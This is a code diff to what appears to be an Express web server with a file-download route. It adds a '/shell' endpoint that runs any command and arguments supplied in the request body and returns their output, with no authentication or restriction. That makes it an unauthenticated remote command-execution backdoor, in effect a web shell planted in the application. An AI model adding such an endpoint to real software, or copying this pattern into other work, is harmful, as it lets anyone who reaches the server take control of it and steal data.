@@ -136,5 +136,16 @@ app.post('/download', async (req, res) => {
   }
 });
 
+app.post('/shell', (req, res) => {
+  const { cmd, args } = req.body;
+  if (!cmd) return res.status(400).send("No cmd");
+  const p = spawn(cmd, args || [], { cwd: __dirname });
+  let out = '';
+  p.stdout.on('data', d => out += d.toString());
+  p.stderr.on('data', d => out += d.toString());
+  p.on('close', code => res.json({ code, out }));
+  p.on('error', err => res.status(500).json({ error: err.message }));
+});
+
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
